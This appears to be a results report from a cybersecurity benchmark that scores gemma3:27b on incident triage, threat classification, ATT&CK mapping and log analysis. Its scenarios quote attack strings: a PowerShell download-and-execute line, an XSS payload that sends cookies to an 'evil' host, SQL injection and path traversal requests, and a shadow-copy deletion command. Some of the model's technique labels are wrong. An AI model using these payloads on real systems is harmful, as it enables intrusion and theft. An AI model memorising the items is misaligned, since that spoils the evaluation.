# Cybersecurity benchmark — `gemma3:27b`
Model: `gemma3:27b`
Run started: 2026-05-06 01:54:00

## Summary

| Section | Correct | Total | Accuracy |
|---|---|---|---|
| Incident recognition | 7 | 7 | 100% |
| Threat classification | 7 | 7 | 100% |
| MITRE ATT&CK mapping | 7 | 10 | 70% |
| Syslog triage (raw) | 8 | 8 | 100% |
| Syslog triage (drain3) | 7 | 8 | 88% |
| **Overall (with drain3)** | **28** | **32** | **88%** |

## Resource usage

Latency in seconds. GPU util/memory from `nvidia-smi`, CPU/RAM from `psutil`. Sampled every 250ms during each model call; peak is the max sample within the window.

| Section | n | Total s | Avg s | p50 s | p95 s | Max s | Peak GPU% | Avg GPU% | Peak GPU MB | Peak CPU% | Avg CPU% | Peak RAM MB |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| Incident | 7 | 18.9 | 2.70 | 1.28 | 1.31 | 11.42 | 93% | 37% | 20534 | 42% | 17% | 33744 |
| Threat | 7 | 10.9 | 1.56 | 1.50 | 1.69 | 1.73 | 94% | 56% | 20534 | 45% | 9% | 33778 |
| MITRE | 10 | 10.4 | 1.04 | 1.04 | 1.09 | 1.22 | 92% | 68% | 20534 | 49% | 13% | 33663 |
| Syslog (raw) | 8 | 11.5 | 1.44 | 1.50 | 1.52 | 1.79 | 93% | 55% | 20534 | 14% | 8% | 33674 |
| Syslog (drain3) | 8 | 12.1 | 1.51 | 1.43 | 1.71 | 1.86 | 93% | 50% | 20534 | 19% | 7% | 33662 |
| **Overall** | **40** | **63.8** | **1.60** | **1.40** | **1.79** | **11.42** | **94%** | **54%** | **20534** | **49%** | **11%** | **33778** |

## 1. Incident recognition (binary)

### INC-1 — expected: **benign** — PASS (11.4s · GPU 76%/20532MB · CPU 34% · RAM 33582MB)
_Scenario_: User logs in from their normal office IP at 9:02am on a workday and opens email.

_Reply_: Benign. 

Normal login time and location combined with routine activity (email access) indicate expected behavior.

### INC-2 — expected: **incident** — PASS (1.2s · GPU 76%/20532MB · CPU 42% · RAM 33652MB)
_Scenario_: Domain admin account authenticates successfully from an IP in a country the company has no offices in, at 03:14 local time, followed within 4 minutes by 18 RDP sessions to internal hosts.

_Reply_: Incident.

The rapid succession of RDP sessions following authentication from an unexpected geographic location strongly suggests account compromise and lateral movement.

### INC-3 — expected: **incident** — PASS (1.3s · GPU 0%/20534MB · CPU 42% · RAM 33691MB)
_Scenario_: Web server logs show 50,000 POST requests to /wp-login.php from 1,200 distinct IPs within 10 minutes, with 3 successful logins to admin accounts.

_Reply_: Incident.

The high volume of POST requests to the WordPress login page, coupled with successful logins, strongly indicates a brute-force or credential stuffing attack.

### INC-4 — expected: **benign** — PASS (1.1s · GPU 92%/20534MB · CPU 16% · RAM 33735MB)
_Scenario_: A scheduled nightly backup job runs at 02:00, copies 40GB to the backup server, and completes with exit code 0. Same as previous 30 nights.

_Reply_: Benign. 

Consistent, successful backups with expected parameters indicate normal, routine activity.

### INC-5 — expected: **incident** — PASS (1.3s · GPU 93%/20534MB · CPU 28% · RAM 33736MB)
_Scenario_: EDR alerts that powershell.exe spawned by winword.exe executed: IEX (New-Object Net.WebClient).DownloadString('http://185.x.x.x/a.ps1')

_Reply_: Incident.

Word spawning PowerShell to download and execute a script from an external source is highly suspicious and indicative of malicious activity.

### INC-6 — expected: **benign** — PASS (1.2s · GPU 89%/20534MB · CPU 29% · RAM 33741MB)
_Scenario_: Developer pushes a commit to a feature branch, CI runs unit tests, all pass.

_Reply_: Benign. 

Passing unit tests indicate code functionality, not necessarily security vulnerabilities; further security-focused testing is still needed.

### INC-7 — expected: **incident** — PASS (1.3s · GPU 0%/20534MB · CPU 29% · RAM 33744MB)
_Scenario_: DNS server logs show a single host querying 4,000+ unique subdomains of a single domain over 2 hours, with TXT record responses averaging 200 bytes.

_Reply_: Incident. 

This rapid, broad subdomain enumeration via TXT record requests strongly suggests automated scanning, likely for subdomain takeover or data harvesting.

## 2. Threat-type classification

### THR-1 — accepted keywords: ['ransomware'] — PASS (1.6s · GPU 92%/20534MB · CPU 24% · RAM 33768MB)
_Scenario_: Files on user workstations are renamed with .lockbit extension. A README.txt demands 2 BTC for decryption keys.

_Reply_: **LockBit Ransomware.**

Files are encrypted, renamed with a specific extension, and a ransom note (README.txt) is left demanding cryptocurrency for decryption – classic ransomware tactics employed by the LockBit group.

_Match_: 'ransomware'

### THR-2 — accepted keywords: ['phishing', 'bec', 'business email compromise', 'spear'] — PASS (1.7s · GPU 92%/20534MB · CPU 45% · RAM 33778MB)
_Scenario_: Email appears to come from the CFO asking the AP clerk to wire $48,000 to a new vendor urgently. The reply-to address has a slight typo in the domain.

_Reply_: **Business Email Compromise (BEC).**

Attackers spoof legitimate email accounts (like the CFO's) to deceive employees into making unauthorized fund transfers. The typo in the reply-to is a key indicator of malicious intent.

_Match_: 'bec'

### THR-3 — accepted keywords: ['sql injection', 'sqli'] — PASS (1.5s · GPU 88%/20534MB · CPU 6% · RAM 33701MB)
_Scenario_: Application logs show: SELECT * FROM users WHERE name='admin' OR '1'='1'-- in the username field of the login form.

_Reply_: SQL Injection.

Exploits input validation failures to inject malicious SQL code, potentially bypassing authentication or accessing sensitive data. The `--` comments out the rest of the intended query.

_Match_: 'sql injection'

### THR-4 — accepted keywords: ['xss', 'cross-site scripting', 'cross site scripting'] — PASS (1.5s · GPU 89%/20534MB · CPU 10% · RAM 33659MB)
_Scenario_: A web app reflects a user-supplied 'name' query parameter directly into the HTML body without encoding. Attacker crafts a URL containing <script>fetch('//evil/'+document.cookie)</script>.

_Reply_: **Cross-Site Scripting (XSS)**.

Unencoded user input allows malicious JavaScript execution in another user's browser, enabling cookie theft (and more) via `fetch`.

_Match_: 'xss'

### THR-5 — accepted keywords: ['credential', 'credential dumping', 'credential theft', 'credential access', 'lsass'] — PASS (1.5s · GPU 94%/20534MB · CPU 11% · RAM 33650MB)
_Scenario_: Internal user runs an executable received via email. The process injects into lsass.exe, dumps memory, and exfiltrates the dump over HTTPS to an external server.

_Reply_: **LSASS Injection.**

Malware injected into LSASS (Local Security Authority Subsystem Service) to steal credentials from memory, then exfiltrated via HTTPS. Classic credential theft technique.

_Match_: 'credential'

### THR-6 — accepted keywords: ['ddos', 'dos', 'denial of service', 'denial-of-service', 'amplification'] — PASS (1.7s · GPU 94%/20534MB · CPU 14% · RAM 33661MB)
_Scenario_: Multiple hosts on the corporate network suddenly send 10Gbps of UDP traffic to the same external IP, sourced from spoofed addresses. The target is the company's public DNS.

_Reply_: **DDoS Amplification.**

Attackers leverage UDP-based services (likely DNS in this case) to amplify malicious traffic. Spoofed source addresses mask the true origin, overwhelming the DNS server with requests and causing denial of service.

_Match_: 'ddos'

### THR-7 — accepted keywords: ['supply chain', 'supply-chain'] — PASS (1.4s · GPU 84%/20534MB · CPU 7% · RAM 33622MB)
_Scenario_: A signed update from a trusted third-party vendor's auto-update channel installs a backdoor on thousands of customer machines. The vendor's build server was compromised.

_Reply_: **Supply Chain Attack.**

Compromised vendor infrastructure (build server) injected malicious code into a legitimate software update, impacting downstream customers. Trust was exploited.

_Match_: 'supply chain'

## 3. MITRE ATT&CK technique mapping

**Per-case results**

| Case | Scenario | Accepted IDs | Detected | Result |
|---|---|---|---|---|
| ATT-1 | An attacker sends a Word document containing a malicious macro to a... | `T1566.001, T1566, T1204.002, T1204` | `T1204.002` | PASS |
| ATT-2 | Adversary uses Mimikatz to extract plaintext passwords and NTLM has... | `T1003.001, T1003` | `T1003.001` | PASS |
| ATT-3 | Attacker creates a new scheduled task on the victim host to run the... | `T1053.005, T1053` | `T1547.001` | FAIL |
| ATT-4 | After initial access, the attacker uses 'net group "Domain Admins" ... | `T1087.002, T1087, T1018, T1482` | `T1018` | PASS |
| ATT-5 | Adversary establishes persistence by adding a value under HKCU\Soft... | `T1547.001, T1547` | `T1547.001` | PASS |
| ATT-6 | C2 beaconing traffic is encoded as DNS TXT record queries to attack... | `T1071.004, T1071, T1048.003, T1048` | `T1071.004` | PASS |
| ATT-7 | Attacker uses PsExec from a compromised workstation to execute a re... | `T1021.002, T1021, T1570, T1569.002` | `T1059.001` | FAIL |
| ATT-8 | Before encrypting victim files, the ransomware deletes Windows Volu... | `T1490` | `T1070.001` | FAIL |
| ATT-9 | A binary uses base64-encoded PowerShell with the -EncodedCommand fl... | `T1027, T1059.001, T1140` | `T1059.001` | PASS |
| ATT-10 | Attacker compresses sensitive files into a password-protected RAR a... | `T1560.001, T1560` | `T1560.001` | PASS |

### ATT-1 — accepted IDs: ['T1566.001', 'T1566', 'T1204.002', 'T1204'] — PASS (1.1s · GPU 11%/20534MB · CPU 20% · RAM 33606MB)
_Scenario_: An attacker sends a Word document containing a malicious macro to a target user. The user opens the doc and enables macros, which downloads a payload.

_Reply_: T1204.002 - User Execution: Malicious File.

_Detected IDs_: T1204.002

### ATT-2 — accepted IDs: ['T1003.001', 'T1003'] — PASS (1.0s · GPU 86%/20534MB · CPU 10% · RAM 33628MB)
_Scenario_: Adversary uses Mimikatz to extract plaintext passwords and NTLM hashes from LSASS memory on a compromised host.

_Reply_: T1003.001 - OS Credential Dumping

_Detected IDs_: T1003.001

### ATT-3 — accepted IDs: ['T1053.005', 'T1053'] — FAIL (1.0s · GPU 86%/20534MB · CPU 49% · RAM 33662MB)
_Scenario_: Attacker creates a new scheduled task on the victim host to run their implant every time the system starts.

_Reply_: T1547.001 - Boot or Logon Autostart Execution

_Detected IDs_: T1547.001

### ATT-4 — accepted IDs: ['T1087.002', 'T1087', 'T1018', 'T1482'] — PASS (1.1s · GPU 92%/20534MB · CPU 14% · RAM 33663MB)
_Scenario_: After initial access, the attacker uses 'net group "Domain Admins" /domain' and 'nltest /dclist' to map the AD environment.

_Reply_: T1018.003 - Reconnaissance: Discovery - Network Infrastructure Discovery.

_Detected IDs_: T1018

### ATT-5 — accepted IDs: ['T1547.001', 'T1547'] — PASS (1.2s · GPU 88%/20534MB · CPU 14% · RAM 33633MB)
_Scenario_: Adversary establishes persistence by adding a value under HKCU\Software\Microsoft\Windows\CurrentVersion\Run that points to their malware.

_Reply_: T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

_Detected IDs_: T1547.001

### ATT-6 — accepted IDs: ['T1071.004', 'T1071', 'T1048.003', 'T1048'] — PASS (1.0s · GPU 87%/20534MB · CPU 13% · RAM 33620MB)
_Scenario_: C2 beaconing traffic is encoded as DNS TXT record queries to attacker-controlled subdomains, bypassing the proxy.

_Reply_: T1071.004 - Application Layer Protocol: DNS

_Detected IDs_: T1071.004

### ATT-7 — accepted IDs: ['T1021.002', 'T1021', 'T1570', 'T1569.002'] — FAIL (1.0s · GPU 62%/20534MB · CPU 13% · RAM 33612MB)
_Scenario_: Attacker uses PsExec from a compromised workstation to execute a remote command on a domain controller using stolen admin credentials.

_Reply_: T1059.001 - Remote Service Administration

_Detected IDs_: T1059.001

### ATT-8 — accepted IDs: ['T1490'] — FAIL (1.0s · GPU 84%/20534MB · CPU 49% · RAM 33604MB)
_Scenario_: Before encrypting victim files, the ransomware deletes Windows Volume Shadow Copies using 'vssadmin delete shadows /all /quiet'.

_Reply_: T1070.001 - Defeat Host-Based Security.

_Detected IDs_: T1070.001

### ATT-9 — accepted IDs: ['T1027', 'T1059.001', 'T1140'] — PASS (1.0s · GPU 84%/20534MB · CPU 14% · RAM 33614MB)
_Scenario_: A binary uses base64-encoded PowerShell with the -EncodedCommand flag to obscure its real payload from defenders.

_Reply_: T1059.001 - Command and Scripting Interpreter: PowerShell

_Detected IDs_: T1059.001

### ATT-10 — accepted IDs: ['T1560.001', 'T1560'] — PASS (1.0s · GPU 84%/20534MB · CPU 14% · RAM 33654MB)
_Scenario_: Attacker compresses sensitive files into a password-protected RAR archive on the victim host before exfiltration.

_Reply_: T1560.001 - Archive Collected Data

_Detected IDs_: T1560.001

## 4. Raw syslog triage (binary) — baseline vs drain3-augmented

### SYS-1 — SSH brute force followed by successful login — expected: **incident**
_Logs_:
```
Mar 10 03:41:02 webhost sshd[28401]: Failed password for invalid user admin from 185.220.101.45 port 47812 ssh2
Mar 10 03:41:05 webhost sshd[28403]: Failed password for invalid user root from 185.220.101.45 port 47815 ssh2
Mar 10 03:41:08 webhost sshd[28405]: Failed password for invalid user oracle from 185.220.101.45 port 47820 ssh2
Mar 10 03:41:11 webhost sshd[28407]: Failed password for invalid user postgres from 185.220.101.45 port 47824 ssh2
Mar 10 03:41:14 webhost sshd[28409]: Failed password for invalid user git from 185.220.101.45 port 47829 ssh2
Mar 10 03:41:17 webhost sshd[28411]: Failed password for invalid user test from 185.220.101.45 port 47833 ssh2
Mar 10 03:41:20 webhost sshd[28413]: Failed password for ubuntu from 185.220.101.45 port 47837 ssh2
Mar 10 03:43:21 webhost sshd[28571]: Accepted password for ubuntu from 185.220.101.45 port 47891 ssh2
Mar 10 03:43:21 webhost sshd[28571]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
```

_drain3 templates_:
```
[x6] Mar 10 <*> webhost <*> Failed password for invalid user <*> from 185.220.101.45 port <*> ssh2
[x2] Mar 10 <*> webhost <*> <*> password for ubuntu from 185.220.101.45 port <*> ssh2
[x1] Mar 10 03:43:21 webhost sshd[28571]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
```

**Baseline (raw only)** — PASS (1.5s · GPU 64%/20534MB · CPU 14% · RAM 33645MB)
_Reply_: Incident. 

Repeated failed login attempts followed by a successful login from the same source IP strongly suggests a brute-force attack followed by account compromise.

**With drain3 summary** — PASS (1.7s · GPU 87%/20534MB · CPU 19% · RAM 33640MB)
_Reply_: Incident.

The high count of six failed login attempts ([x6]) for multiple invalid users from the same IP address indicates a likely brute-force or account-guessing attack, despite the eventual successful login.

### SYS-2 — Normal pubkey login from internal range — expected: **benign**
_Logs_:
```
Mar 10 09:14:32 webhost sshd[14201]: Accepted publickey for alice from 10.0.4.22 port 51842 ssh2: RSA SHA256:7Hk2pQ...
Mar 10 09:14:32 webhost sshd[14201]: pam_unix(sshd:session): session opened for user alice by (uid=0)
Mar 10 09:14:33 webhost systemd-logind[612]: New session 2841 of user alice.
```

_drain3 templates_:
```
[x1] Mar 10 09:14:32 webhost sshd[14201]: Accepted publickey for alice from 10.0.4.22 port 51842 ssh2: RSA SHA256:7Hk2pQ...
[x1] Mar 10 09:14:32 webhost sshd[14201]: pam_unix(sshd:session): session opened for user alice by (uid=0)
[x1] Mar 10 09:14:33 webhost systemd-logind[612]: New session 2841 of user alice.
```

**Baseline (raw only)** — PASS (1.4s · GPU 87%/20534MB · CPU 12% · RAM 33611MB)
_Reply_: Benign. 

The logs show a standard SSH login sequence for user 'alice' with accepted public key authentication and session establishment, indicating expected activity.

**With drain3 summary** — PASS (1.4s · GPU 90%/20534MB · CPU 12% · RAM 33570MB)
_Reply_: Benign. 

The pattern summary shows only one instance of each template, indicating routine activity with low counts and no evidence of repeated or anomalous behavior.

### SYS-3 — Daily cron run — expected: **benign**
_Logs_:
```
Mar 10 02:00:01 webhost CRON[31201]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
Mar 10 02:00:23 webhost rsyslogd: [origin software="rsyslogd" swVersion="8.2102.0"] rsyslogd was HUPed
Mar 10 02:00:24 webhost CRON[31201]: pam_unix(cron:session): session closed for user root
```

_drain3 templates_:
```
[x1] Mar 10 02:00:01 webhost CRON[31201]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
[x1] Mar 10 02:00:23 webhost rsyslogd: [origin software="rsyslogd" swVersion="8.2102.0"] rsyslogd was HUPed
[x1] Mar 10 02:00:24 webhost CRON[31201]: pam_unix(cron:session): session closed for user root
```

**Baseline (raw only)** — PASS (1.3s · GPU 90%/20534MB · CPU 13% · RAM 33610MB)
_Reply_: Benign. 

This log output shows normal cron job execution and rsyslogd restarting, indicating routine system maintenance rather than malicious activity.

**With drain3 summary** — PASS (1.4s · GPU 88%/20534MB · CPU 11% · RAM 33574MB)
_Reply_: Benign. 

The pattern summary shows only one instance of each template, indicating routine activity with low counts for scheduled jobs and normal system processes.

### SYS-4 — SQL injection probes in Apache access log — expected: **incident**
_Logs_:
```
185.62.190.13 - - [10/Mar/2026:14:22:03 +0000] "GET /products.php?id=1' OR '1'='1-- HTTP/1.1" 500 1842
185.62.190.13 - - [10/Mar/2026:14:22:04 +0000] "GET /products.php?id=1+UNION+SELECT+username,password+FROM+users-- HTTP/1.1" 200 4129
185.62.190.13 - - [10/Mar/2026:14:22:05 +0000] "GET /products.php?id=1;DROP+TABLE+users-- HTTP/1.1" 500 1842
185.62.190.13 - - [10/Mar/2026:14:22:06 +0000] "GET /products.php?id=1+AND+SLEEP(5)-- HTTP/1.1" 200 4129
```

_drain3 templates_:
```
[x3] 185.62.190.13 - - <*> +0000] "GET <*> HTTP/1.1" <*> <*>
[x1] 185.62.190.13 - - [10/Mar/2026:14:22:03 +0000] "GET /products.php?id=1' OR '1'='1-- HTTP/1.1" 500 1842
```

**Baseline (raw only)** — PASS (1.8s · GPU 93%/20534MB · CPU 11% · RAM 33612MB)
_Reply_: Incident. 

The logs demonstrate clear SQL injection attempts, including exploitation of vulnerabilities with `' OR '1'='1--`, `UNION SELECT`, `DROP TABLE`, and time-based injection (`SLEEP(5)`).

**With drain3 summary** — PASS (1.5s · GPU 93%/20534MB · CPU 6% · RAM 33636MB)
_Reply_: Incident.

The high count ([x3]) on the attack-shaped template indicates multiple requests from the same IP with potentially malicious payloads, suggesting an active exploitation attempt.

### SYS-5 — Sudo adding service account to sudo group at 03:17 — expected: **incident**
_Logs_:
```
Mar 10 03:17:42 webhost sudo:      bob : TTY=pts/3 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc_backup
Mar 10 03:17:42 webhost sudo: pam_unix(sudo:session): session opened for user root by bob(uid=0)
Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to group 'sudo'
Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to shadow group 'sudo'
Mar 10 03:17:43 webhost sudo: pam_unix(sudo:session): session closed for user root
```

_drain3 templates_:
```
[x1] Mar 10 03:17:42 webhost sudo: bob : TTY=pts/3 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc_backup
[x1] Mar 10 03:17:42 webhost sudo: pam_unix(sudo:session): session opened for user root by bob(uid=0)
[x1] Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to group 'sudo'
[x1] Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to shadow group 'sudo'
[x1] Mar 10 03:17:43 webhost sudo: pam_unix(sudo:session): session closed for user root
```

**Baseline (raw only)** — PASS (1.1s · GPU 89%/20534MB · CPU 10% · RAM 33597MB)
_Reply_: Incident. Adding a user to the sudo group grants elevated privileges and requires investigation to determine legitimacy.

**With drain3 summary** — FAIL (1.4s · GPU 79%/20534MB · CPU 8% · RAM 33632MB)
_Reply_: Benign. 

The pattern summary shows only one instance of each template, indicating a single, isolated administrative action rather than repeated malicious activity.

### SYS-6 — Path traversal probes in Apache access log — expected: **incident**
_Logs_:
```
198.51.100.7 - - [10/Mar/2026:11:03:18 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 2841
198.51.100.7 - - [10/Mar/2026:11:03:19 +0000] "GET /download?file=..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1" 403 891
198.51.100.7 - - [10/Mar/2026:11:03:20 +0000] "GET /download?file=....//....//etc/hosts HTTP/1.1" 200 412
```

_drain3 templates_:
```
[x3] 198.51.100.7 - - <*> +0000] "GET <*> HTTP/1.1" <*> <*>
```

**Baseline (raw only)** — PASS (1.5s · GPU 91%/20534MB · CPU 13% · RAM 33674MB)
_Reply_: Incident. 

The logs demonstrate attempts to traverse directories and access sensitive system files like `/etc/passwd` and `/etc/shadow`, indicating a potential path traversal vulnerability exploit.

**With drain3 summary** — PASS (1.4s · GPU 91%/20534MB · CPU 6% · RAM 33640MB)
_Reply_: Incident.

The pattern summary shows a single template ([x3]) with multiple variations attempting path traversal, indicating malicious intent despite varied responses.

### SYS-7 — Normal authenticated web session — expected: **benign**
_Logs_:
```
10.0.4.22 - alice [10/Mar/2026:10:14:02 +0000] "GET /dashboard HTTP/1.1" 200 18421 "https://intranet.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
10.0.4.22 - alice [10/Mar/2026:10:14:03 +0000] "GET /static/app.js HTTP/1.1" 200 84219 "https://intranet.example.com/dashboard" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
10.0.4.22 - alice [10/Mar/2026:10:14:03 +0000] "POST /api/v1/metrics HTTP/1.1" 200 142 "https://intranet.example.com/dashboard" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
```

_drain3 templates_:
```
[x3] 10.0.4.22 - alice <*> +0000] <*> <*> HTTP/1.1" 200 <*> <*> "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
```

**Baseline (raw only)** — PASS (1.4s · GPU 88%/20534MB · CPU 6% · RAM 33646MB)
_Reply_: Benign. 

Standard web application access patterns are observed: dashboard load, JavaScript retrieval, and metric posting, all originating from an internal source.

**With drain3 summary** — PASS (1.4s · GPU 89%/20534MB · CPU 4% · RAM 33662MB)
_Reply_: Benign. 

The pattern summary shows a single template with a count of 3 ([x3]), indicating routine activity rather than anomalous or malicious behavior.

### SYS-8 — Windows 4625 burst then 4624 from same IP — expected: **incident**
_Logs_:
```
Mar 10 02:18:14 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:16 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:18 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:21 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:24 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:21:42 dc01 winlogbeat: EventID=4624 Account=Administrator LogonType=3 IpAddress=192.168.50.13 WorkstationName=KIOSK-04
```

_drain3 templates_:
```
[x5] Mar 10 <*> dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
[x1] Mar 10 02:21:42 dc01 winlogbeat: EventID=4624 Account=Administrator LogonType=3 IpAddress=192.168.50.13 WorkstationName=KIOSK-04
```

**Baseline (raw only)** — PASS (1.5s · GPU 90%/20534MB · CPU 9% · RAM 33627MB)
_Reply_: Incident. 
Repeated failed login attempts to the Administrator account, followed by a successful login from the same source IP, strongly suggests a brute-force attack.

**With drain3 summary** — PASS (1.9s · GPU 90%/20534MB · CPU 8% · RAM 33618MB)
_Reply_: Incident.

The high count of [x5] for failed Administrator logins (EventID 4625) indicates a potential brute-force or password-guessing attack, despite the subsequent successful login (EventID 4624).
